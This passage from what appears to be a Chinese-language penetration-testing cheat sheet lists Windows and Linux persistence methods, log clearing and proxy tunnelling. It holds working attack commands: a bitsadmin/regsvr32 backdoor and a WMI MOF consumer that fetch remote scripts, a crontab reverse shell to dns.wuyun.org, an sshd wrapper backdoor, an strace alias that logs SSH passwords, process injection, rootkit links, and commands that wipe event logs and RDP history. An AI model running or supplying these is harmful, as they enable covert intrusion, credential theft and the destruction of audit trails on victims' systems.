class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</span><br></pre></td></tr></table></figure><h5 id="4、BootExecute-Key"><a href="#4、BootExecute-Key" class="headerlink" title="4、BootExecute Key"></a>4、BootExecute Key</h5><p>由于smss.exe在Windows子系统加载之前启动，因此会调用配置子系统来加载当前的配置单元，具体注册表键值为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HKLM\SYSTEM\CurrentControlSet\Control\hivelist</span><br><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Control\Session Manager</span><br></pre></td></tr></table></figure><h5 id="5、Userinit-Key"><a href="#5、Userinit-Key" class="headerlink" title="5、Userinit Key"></a>5、Userinit Key</h5><p>WinLogon进程加载的login scripts,具体键值：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</span><br></pre></td></tr></table></figure><h5 id="6、Startup-Keys"><a href="#6、Startup-Keys" class="headerlink" title="6、Startup Keys"></a>6、Startup Keys</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</span><br></pre></td></tr></table></figure><h5 id="7、Services"><a href="#7、Services" class="headerlink" title="7、Services"></a>7、Services</h5><p>创建服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc create [ServerName] binPath&#x3D; BinaryPathName</span><br></pre></td></tr></table></figure><h5 id="8、Browser-Helper-Objects"><a href="#8、Browser-Helper-Objects" class="headerlink" title="8、Browser Helper Objects"></a>8、Browser Helper Objects</h5><p>本质上是Internet Explorer启动时加载的DLL模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects</span><br></pre></td></tr></table></figure><h5 id="9、AppInit-DLLs"><a href="#9、AppInit-DLLs" class="headerlink" title="9、AppInit_DLLs"></a>9、AppInit_DLLs</h5><p>加载User32.dll会加载的DLL</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs</span><br></pre></td></tr></table></figure><h5 id="10、文件关联"><a href="#10、文件关联" class="headerlink" title="10、文件关联"></a>10、文件关联</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\Software\Classes</span><br><span class="line">HKEY_CLASSES_ROOT</span><br></pre></td></tr></table></figure><h5 id="11、bitsadmin"><a href="#11、bitsadmin" class="headerlink" title="11、bitsadmin"></a>11、<a href="http://www.liuhaihua.cn/archives/357579.html">bitsadmin</a></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin &#x2F;create backdoor</span><br><span class="line">bitsadmin &#x2F;addfile backdoor %comspec% %temp%\cmd.exe</span><br><span class="line">bitsadmin.exe &#x2F;SetNotifyCmdLine backdoor regsvr32.exe &quot;&#x2F;u &#x2F;s &#x2F;i:https:&#x2F;&#x2F;host.com&#x2F;calc.sct scrobj.dll&quot;</span><br><span class="line">bitsadmin &#x2F;Resume backdoor</span><br></pre></td></tr></table></figure><h5 id="12、mof"><a href="#12、mof" class="headerlink" title="12、mof"></a>12、<a href="https://evi1cg.me/archives/Powershell_MOF_Backdoor.html">mof</a></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pragma namespace(&quot;\\\\.\\root\\subscription&quot;) </span><br><span class="line">instance of __EventFilter as $EventFilter</span><br><span class="line">&#123;</span><br><span class="line">EventNamespace &#x3D; &quot;Root\\Cimv2&quot;;</span><br><span class="line">Name &#x3D; &quot;filtP1&quot;;</span><br><span class="line">Query &#x3D; &quot;Select * From __InstanceModificationEvent &quot;</span><br><span class="line">&quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;</span><br><span class="line">&quot;And TargetInstance.Second &#x3D; 1&quot;;</span><br><span class="line">QueryLanguage &#x3D; &quot;WQL&quot;;</span><br><span class="line">&#125;; </span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer</span><br><span class="line">&#123;</span><br><span class="line">Name &#x3D; &quot;consP1&quot;;</span><br><span class="line">ScriptingEngine &#x3D; &quot;JScript&quot;;</span><br><span class="line">ScriptText &#x3D; &quot;GetObject(\&quot;script:https:&#x2F;&#x2F;host.com&#x2F;test\&quot;)&quot;;</span><br><span class="line">&#125;; </span><br><span class="line">instance of __FilterToConsumerBinding</span><br><span class="line">&#123;</span><br><span class="line">Consumer &#x3D; $Consumer;</span><br><span class="line">Filter &#x3D; $EventFilter;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>管理员执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mofcomp test.mof</span><br></pre></td></tr></table></figure><h5 id="13、wmi"><a href="#13、wmi" class="headerlink" title="13、wmi"></a>13、<a href="https://3gstudent.github.io/Study-Notes-of-WMI-Persistence-using-wmic.exe">wmi</a></h5><p>每隔60秒执行一次notepad.exe</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wmic &#x2F;NAMESPACE:&quot;\\root\subscription&quot; PATH __EventFilter CREATE Name&#x3D;&quot;BotFilter82&quot;, EventNameSpace&#x3D;&quot;root\cimv2&quot;,QueryLanguage&#x3D;&quot;WQL&quot;, Query&#x3D;&quot;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA &#39;Win32_PerfFormattedData_PerfOS_System&#39;&quot;</span><br><span class="line"></span><br><span class="line">wmic &#x2F;NAMESPACE:&quot;\\root\subscription&quot; PATH CommandLineEventConsumer CREATE Name&#x3D;&quot;BotConsumer23&quot;, ExecutablePath&#x3D;&quot;C:\Windows\System32\notepad.exe&quot;,CommandLineTemplate&#x3D;&quot;C:\Windows\System32\notepad.exe&quot;</span><br><span class="line"></span><br><span class="line">wmic &#x2F;NAMESPACE:&quot;\\root\subscription&quot; PATH __FilterToConsumerBinding CREATE Filter&#x3D;&quot;__EventFilter.Name&#x3D;\&quot;BotFilter82\&quot;&quot;, Consumer&#x3D;&quot;CommandLineEventConsumer.Name&#x3D;\&quot;BotConsumer23\&quot;&quot;</span><br></pre></td></tr></table></figure><h5 id="14、Userland-Persistence-With-Scheduled-Tasks"><a href="#14、Userland-Persistence-With-Scheduled-Tasks" class="headerlink" title="14、Userland Persistence With Scheduled Tasks"></a>14、<a href="https://3gstudent.github.io/Userland-registry-hijacking">Userland Persistence With Scheduled Tasks</a></h5><p>劫持计划任务UserTask，在系统启动时加载dll</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">function Invoke-ScheduledTaskComHandlerUserTask</span><br><span class="line">&#123;</span><br><span class="line">[<span class="meta">CmdletBinding(SupportsShouldProcess = $True, ConfirmImpact = &#x27;Medium&#x27;)</span>]</span><br><span class="line">Param (</span><br><span class="line">[<span class="meta">Parameter(Mandatory = $True)</span>]</span><br><span class="line">[<span class="meta">ValidateNotNullOrEmpty()</span>]</span><br><span class="line">[<span class="meta">String</span>]</span><br><span class="line">$Command,</span><br><span class="line"></span><br><span class="line">[<span class="meta">Switch</span>]</span><br><span class="line">$Force</span><br><span class="line">)</span><br><span class="line">$ScheduledTaskCommandPath = <span class="string">&quot;HKCU:\Software\Classes\CLSID\&#123;58fb76b9-ac85-4e55-ac04-427593b1d060&#125;\InprocServer32&quot;</span></span><br><span class="line"><span class="keyword">if</span> ($Force -<span class="keyword">or</span> ((Get-ItemProperty -Path $ScheduledTaskCommandPath -Name <span class="string">&#x27;(default)&#x27;</span> -ErrorAction SilentlyContinue) -eq $<span class="literal">null</span>))&#123;</span><br><span class="line">New-Item $ScheduledTaskCommandPath -Force |</span><br><span class="line">New-ItemProperty -Name <span class="string">&#x27;(Default)&#x27;</span> -Value $Command -PropertyType <span class="built_in">string</span> -Force | Out-Null</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">Write-Verbose <span class="string">&quot;Key already exists, consider using -Force&quot;</span></span><br><span class="line">exit</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (Test-Path $ScheduledTaskCommandPath) &#123;</span><br><span class="line">Write-Verbose <span class="string">&quot;Created registry entries to hijack the UserTask&quot;</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">Write-Warning <span class="string">&quot;Failed to create registry key, exiting&quot;</span></span><br><span class="line">exit</span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line">Invoke-ScheduledTaskComHandlerUserTask -Command <span class="string">&quot;C:\test\testmsg.dll&quot;</span> -Verbose</span><br></pre></td></tr></table></figure><h5 id="15、Netsh"><a href="#15、Netsh" class="headerlink" title="15、Netsh"></a>15、<a href="https://3gstudent.github.io/Netsh-persistence">Netsh</a></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh add helper c:\test\netshtest.dll</span><br></pre></td></tr></table></figure><p>后门触发：每次调用netsh</p><blockquote><p>dll编写:<a href="https://github.com/outflanknl/NetshHelperBeacon">https://github.com/outflanknl/NetshHelperBeacon</a></p></blockquote><h5 id="16、Shim"><a href="#16、Shim" class="headerlink" title="16、Shim"></a>16、<a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84Application-Compatibility-Shims">Shim</a></h5><p>常用方式： InjectDll RedirectShortcut RedirectEXE</p><h5 id="17、DLL劫持"><a href="#17、DLL劫持" class="headerlink" title="17、DLL劫持"></a>17、<a href="https://3gstudent.github.io/DLL%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E%E8%87%AA%E5%8A%A8%E5%8C%96%E8%AF%86%E5%88%AB%E5%B7%A5%E5%85%B7Rattler%E6%B5%8B%E8%AF%95">DLL劫持</a></h5><p>通过Rattler自动枚举进程，检测是否存在可用dll劫持利用的进程 使用：Procmon半自动测试更精准，常规生成的dll会导致程序执行报错或中断，使用AheadLib配合生成dll劫持利用源码不会影响程序执行 </p><p>工具：<a href="https://github.com/sensepost/rattler">https://github.com/sensepost/rattler</a> </p><p>工具：<a href="https://github.com/Yonsm/AheadLib">https://github.com/Yonsm/AheadLib</a></p><p>dll劫持不多说</p><h5 id="18、DoubleAgent"><a href="#18、DoubleAgent" class="headerlink" title="18、DoubleAgent"></a>18、<a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84Application-Verifier(DoubleAgent%E5%88%A9%E7%94%A8%E4%BB%8B%E7%BB%8D)">DoubleAgent</a></h5><p>编写自定义Verifier provider DLL 通过Application Verifier进行安装 注入到目标进程执行payload 每当目标进程启动，均会执行payload，相当于一个自启动的方式 POC : <a href="https://github.com/Cybellum/DoubleAgent">https://github.com/Cybellum/DoubleAgent</a></p><h5 id="19、waitfor-exe"><a href="#19、waitfor-exe" class="headerlink" title="19、waitfor.exe"></a>19、<a href="https://3gstudent.github.io/Use-Waitfor.exe-to-maintain-persistence">waitfor.exe</a></h5><p>不支持自启动，但可远程主动激活，后台进程显示为waitfor.exe POC : <a href="https://github.com/3gstudent/Waitfor-Persistence">https://github.com/3gstudent/Waitfor-Persistence</a></p><h5 id="20、AppDomainManager"><a href="#20、AppDomainManager" class="headerlink" title="20、AppDomainManager"></a>20、<a href="https://3gstudent.github.io/Use-AppDomainManager-to-maintain-persistence">AppDomainManager</a></h5><p>针对.Net程序，通过修改AppDomainManager能够劫持.Net程序的启动过程。如果劫持了系统常见.Net程序如powershell.exe的启动过程，向其添加payload，就能实现一种被动的后门触发机制</p><h5 id="21、Office"><a href="#21、Office" class="headerlink" title="21、Office"></a>21、Office</h5><p><a href="https://3gstudent.github.io/%E5%88%A9%E7%94%A8BDF%E5%90%91DLL%E6%96%87%E4%BB%B6%E6%A4%8D%E5%85%A5%E5%90%8E%E9%97%A8">劫持Office软件的特定功能</a>:通过dll劫持,在Office软件执行特定功能时触发后门 <a href="https://3gstudent.github.io/%E5%88%A9%E7%94%A8VSTO%E5%AE%9E%E7%8E%B0%E7%9A%84office%E5%90%8E%E9%97%A8">利用VSTO实现的office后门</a> <a href="https://github.com/3gstudent/Office-Persistence">Office加载项</a></p><ul><li>Word WLL</li><li>Excel XLL</li><li>Excel VBA add-ins</li><li>PowerPoint VBA add-ins</li></ul><blockquote><p>参考1 ：<a href="https://3gstudent.github.io/Use-Office-to-maintain-persistence">https://3gstudent.github.io/Use-Office-to-maintain-persistence</a></p></blockquote><blockquote><p>参考2 ：<a href="https://3gstudent.github.io/Office-Persistence-on-x64-operating-system">https://3gstudent.github.io/Office-Persistence-on-x64-operating-system</a></p></blockquote><h5 id="22、CLR"><a href="#22、CLR" class="headerlink" title="22、CLR"></a>22、<a href="https://3gstudent.github.io/Use-CLR-to-maintain-persistence">CLR</a></h5><p>无需管理员权限的后门，并能够劫持所有.Net程序 POC:<a href="https://github.com/3gstudent/CLR-Injection">https://github.com/3gstudent/CLR-Injection</a></p><h5 id="23、msdtc"><a href="#23、msdtc" class="headerlink" title="23、msdtc"></a>23、<a href="https://3gstudent.github.io/Use-msdtc-to-maintain-persistence">msdtc</a></h5><p>利用MSDTC服务加载dll，实现自启动，并绕过Autoruns对启动项的检测 利用：向 %windir%\system32\目录添加dll并重命名为oci.dll</p><h5 id="24、Hijack-CAccPropServicesClass-and-MMDeviceEnumerato"><a href="#24、Hijack-CAccPropServicesClass-and-MMDeviceEnumerato" class="headerlink" title="24、Hijack CAccPropServicesClass and MMDeviceEnumerato"></a>24、<a href="https://3gstudent.github.io/Use-COM-Object-hijacking-to-maintain-persistence-Hijack-CAccPropServicesClass-and-MMDeviceEnumerator">Hijack CAccPropServicesClass and MMDeviceEnumerato</a></h5><p>利用COM组件，不需要重启系统，不需要管理员权限 通过修改注册表实现 POC：<a href="https://github.com/3gstudent/COM-Object-hijacking">https://github.com/3gstudent/COM-Object-hijacking</a></p><h5 id="25、Hijack-explorer-exe"><a href="#25、Hijack-explorer-exe" class="headerlink" title="25、Hijack explorer.exe"></a>25、<a href="https://3gstudent.github.io/Use-COM-Object-hijacking-to-maintain-persistence-Hijack-explorer.exe">Hijack explorer.exe</a></h5><p>COM组件劫持，不需要重启系统，不需要管理员权限 通过修改注册表实现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HKCU\Software\Classes\CLSID&#123;42aedc87-2188-41fd-b9a3-0c966feabec1&#125;</span><br><span class="line">HKCU\Software\Classes\CLSID&#123;fbeb8a05-beee-4442-804e-409d6c4515e9&#125;</span><br><span class="line">HKCU\Software\Classes\CLSID&#123;b5f8350b-0548-48b1-a6ee-88bd00b4a5e7&#125;</span><br><span class="line">HKCU\Software\Classes\Wow6432Node\CLSID&#123;BCDE0395-E52F-467C-8E3D-C4579291692E&#125;</span><br></pre></td></tr></table></figure><h5 id="26、Windows-FAX-DLL-Injection"><a href="#26、Windows-FAX-DLL-Injection" class="headerlink" title="26、Windows FAX DLL Injection"></a>26、Windows FAX DLL Injection</h5><p>通过DLL劫持，劫持Explorer.exe对<code>fxsst.dll</code>的加载 Explorer.exe在启动时会加载<code>c:\Windows\System32\fxsst.dll</code>(服务默认开启，用于传真服务)将payload.dll保存在<code>c:\Windows\fxsst.dll</code>，能够实现dll劫持，劫持Explorer.exe对<code>fxsst.dll</code>的加载</p><h5 id="27、特殊注册表键值"><a href="#27、特殊注册表键值" class="headerlink" title="27、特殊注册表键值"></a>27、特殊注册表键值</h5><p>在注册表启动项创建特殊名称的注册表键值，用户正常情况下无法读取(使用Win32 API)，但系统能够执行(使用Native API)。</p><p><a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E9%9A%90%E8%97%8F-%E6%B3%A8%E5%86%8C%E8%A1%A8%E7%9A%84%E5%88%9B%E5%BB%BA">《渗透技巧——“隐藏”注册表的创建》</a></p><p><a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E9%9A%90%E8%97%8F-%E6%B3%A8%E5%86%8C%E8%A1%A8%E7%9A%84%E6%9B%B4%E5%A4%9A%E6%B5%8B%E8%AF%95">《渗透技巧——“隐藏”注册表的更多测试》</a></p><h5 id="28、快捷方式后门"><a href="#28、快捷方式后门" class="headerlink" title="28、快捷方式后门"></a>28、快捷方式后门</h5><p>替换我的电脑快捷方式启动参数 POC : <a href="https://github.com/Ridter/Pentest/blob/master/powershell/MyShell/Backdoor/LNK_backdoor.ps1">https://github.com/Ridter/Pentest/blob/master/powershell/MyShell/Backdoor/LNK_backdoor.ps1</a></p><h5 id="29、Logon-Scripts"><a href="#29、Logon-Scripts" class="headerlink" title="29、Logon Scripts"></a>29、<a href="https://3gstudent.github.io/Use-Logon-Scripts-to-maintain-persistence">Logon Scripts</a></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">New-ItemProperty &quot;HKCU:\Environment\&quot; UserInitMprLogonScript -value &quot;c:\test\11.bat&quot; -propertyType string | Out-Null</span><br></pre></td></tr></table></figure><h5 id="30、Password-Filter-DLL"><a href="#30、Password-Filter-DLL" class="headerlink" title="30、Password Filter DLL"></a>30、<a href="https://3gstudent.github.io/Password-Filter-DLL%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8">Password Filter DLL</a></h5><h5 id="31、利用BHO实现IE浏览器劫持"><a href="#31、利用BHO实现IE浏览器劫持" class="headerlink" title="31、利用BHO实现IE浏览器劫持"></a>31、<a href="https://3gstudent.github.io/%E5%88%A9%E7%94%A8BHO%E5%AE%9E%E7%8E%B0IE%E6%B5%8F%E8%A7%88%E5%99%A8%E5%8A%AB%E6%8C%81">利用BHO实现IE浏览器劫持</a></h5><h2 id="Linux-3"><a href="#Linux-3" class="headerlink" title="Linux"></a>Linux</h2><h5 id="crontab"><a href="#crontab" class="headerlink" title="crontab"></a>crontab</h5><p>每60分钟反弹一次shell给dns.wuyun.org的53端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!bash</span><br><span class="line">(crontab -l;printf &quot;*&#x2F;60 * * * * exec 9&lt;&gt; &#x2F;dev&#x2F;tcp&#x2F;dns.wuyun.org&#x2F;53;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;&#x2F;bin&#x2F;bash --noprofile -i;\rno crontab for &#96;whoami&#96;%100c\n&quot;)|crontab -</span><br></pre></td></tr></table></figure><h5 id="硬链接sshd"><a href="#硬链接sshd" class="headerlink" title="硬链接sshd"></a>硬链接sshd</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!bash</span><br><span class="line">ln -sf &#x2F;usr&#x2F;sbin&#x2F;sshd &#x2F;tmp&#x2F;su; &#x2F;tmp&#x2F;su -oPort&#x3D;2333;</span><br></pre></td></tr></table></figure><p>链接：ssh <a href="mailto:&#114;&#111;&#111;&#116;&#64;&#49;&#x39;&#x32;&#46;&#49;&#54;&#56;&#46;&#x32;&#48;&#54;&#x2e;&#x31;&#x34;&#x32;">&#114;&#111;&#111;&#116;&#64;&#49;&#x39;&#x32;&#46;&#49;&#54;&#56;&#46;&#x32;&#48;&#54;&#x2e;&#x31;&#x34;&#x32;</a> -p 2333</p><h5 id="SSH-Server-wrapper"><a href="#SSH-Server-wrapper" class="headerlink" title="SSH Server wrapper"></a>SSH Server wrapper</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#!bash</span><br><span class="line">cd &#x2F;usr&#x2F;sbin</span><br><span class="line">mv sshd ..&#x2F;bin</span><br><span class="line">echo &#39;#!&#x2F;usr&#x2F;bin&#x2F;perl&#39; &gt;sshd</span><br><span class="line">echo &#39;exec &quot;&#x2F;bin&#x2F;sh&quot; if (getpeername(STDIN) &#x3D;~ &#x2F;^..4A&#x2F;);&#39; &gt;&gt;sshd</span><br><span class="line">echo &#39;exec &#123;&quot;&#x2F;usr&#x2F;bin&#x2F;sshd&quot;&#125; &quot;&#x2F;usr&#x2F;sbin&#x2F;sshd&quot;,@ARGV,&#39; &gt;&gt;sshd</span><br><span class="line">chmod u+x sshd</span><br><span class="line">&#x2F;&#x2F;不用重启也行</span><br><span class="line">&#x2F;etc&#x2F;init.d&#x2F;sshd restart</span><br><span class="line">socat STDIO TCP4:192.168.206.142:22,sourceport&#x3D;13377</span><br></pre></td></tr></table></figure><h5 id="SSH-keylogger"><a href="#SSH-keylogger" class="headerlink" title="SSH keylogger"></a>SSH keylogger</h5><p>vim当前用户下的.bashrc文件,末尾添加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!bash</span><br><span class="line">alias ssh&#x3D;&#39;strace -o &#x2F;tmp&#x2F;sshpwd-&#96;date &#39;+%d%h%m%s&#39;&#96;.log -e read,write,connect -s2048 ssh&#39;</span><br></pre></td></tr></table></figure><p>source .bashrc</p><h5 id="Cymothoa-进程注入backdoor"><a href="#Cymothoa-进程注入backdoor" class="headerlink" title="Cymothoa_进程注入backdoor"></a>Cymothoa_进程注入backdoor</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;cymothoa -p 2270 -s 1 -y 7777</span><br><span class="line">nc -vv ip 7777</span><br></pre></td></tr></table></figure><h5 id="rootkit"><a href="#rootkit" class="headerlink" title="rootkit"></a>rootkit</h5><ul><li><a href="http://core.ipsecs.com/rootkit/patch-to-hack/0x06-openssh-5.9p1.patch.tar.gz">openssh_rootkit</a></li><li><a href="http://core.ipsecs.com/rootkit/kernel-rootkit/ipsecs-kbeast-v1.tar.gz">Kbeast_rootkit</a></li><li>Mafix + Suterusu rootkit</li></ul><h5 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h5><ul><li><a href="https://github.com/Screetsec/Vegile">Vegile</a></li><li><a href="https://github.com/icco/backdoor">backdoor</a></li></ul><h1 id="14-痕迹清理"><a href="#14-痕迹清理" class="headerlink" title="14.痕迹清理"></a>14.痕迹清理</h1><h3 id="Windows日志清除"><a href="#Windows日志清除" class="headerlink" title="Windows日志清除"></a><a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E6%97%A5%E5%BF%97%E7%9A%84%E5%88%A0%E9%99%A4%E4%B8%8E%E7%BB%95%E8%BF%87">Windows日志清除</a></h3><p>获取日志分类列表：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wevtutil el &gt;1.txt</span><br></pre></td></tr></table></figure><p>获取单个日志类别的统计信息： eg.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wevtutil gli &quot;windows powershell&quot;</span><br></pre></td></tr></table></figure><p>回显：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">creationTime: 2016-11-28T06:01:37.986Z</span><br><span class="line">lastAccessTime: 2016-11-28T06:01:37.986Z</span><br><span class="line">lastWriteTime: 2017-08-08T08:01:20.979Z</span><br><span class="line">fileSize: 1118208</span><br><span class="line">attributes: 32</span><br><span class="line">numberOfLogRecords: 1228</span><br><span class="line">oldestRecordNumber: 1</span><br></pre></td></tr></table></figure><p>查看指定日志的具体内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wevtutil qe &#x2F;f:text &quot;windows powershell&quot;</span><br></pre></td></tr></table></figure><p>删除单个日志类别的所有信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wevtutil cl &quot;windows powershell&quot;</span><br></pre></td></tr></table></figure><h3 id="破坏Windows日志记录功能"><a href="#破坏Windows日志记录功能" class="headerlink" title="破坏Windows日志记录功能"></a>破坏Windows日志记录功能</h3><p>利用工具</p><ul><li><a href="https://github.com/hlldz/Invoke-Phant0m">Invoke-Phant0m</a></li><li><a href="https://github.com/3gstudent/Windwos-EventLog-Bypass">Windwos-EventLog-Bypass</a></li></ul><h3 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run clearlogs </span><br><span class="line">clearev </span><br></pre></td></tr></table></figure><h3 id="3389登陆记录清除"><a href="#3389登陆记录清除" class="headerlink" title="3389登陆记录清除"></a>3389登陆记录清除</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">@reg delete &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default&quot; &#x2F;va &#x2F;f</span><br><span class="line">@del &quot;%USERPROFILE%\My Documents\Default.rdp&quot; &#x2F;a</span><br><span class="line">@exit</span><br></pre></td></tr></table></figure><h1 id="15-内网穿透"><a href="#15-内网穿透" class="headerlink" title="15.内网穿透"></a>15.内网穿透</h1><p><strong>区分正向代理与反向代理</strong></p><p>A—-b—-C</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">A去请求C,B作为代理，代替A去访问C，并将返回的结果转发给A   那么B就是正向代理</span><br><span class="line">B主动与A的8888端口连接，并将A:8888的访问转发到C:80上去，并将结果转发给A,则B是反向代理</span><br><span class="line">反向代理优势: 当AB之间有防火墙，不允许A连B,但是允许B连A</span><br></pre></td></tr></table></figure><h4 id="0x01-场景与思路分析"><a href="#0x01-场景与思路分析" class="headerlink" title="0x01 场景与思路分析"></a>0x01 场景与思路分析</h4><h6 id="场景一：内网防火墙对出口流量没有任何端口限制"><a href="#场景一：内网防火墙对出口流量没有任何端口限制" class="headerlink" title="场景一：内网防火墙对出口流量没有任何端口限制"></a>场景一：内网防火墙对出口流量没有任何端口限制</h6><p>思路 <strong>：由于防火墙对出口流量没有任何端口限制，我们的可选择的方案非常灵活，如：反弹shell</strong></p><h6 id="场景二：内网防火墙仅允许内网主机访问外网的特定端口（如：80-443）"><a 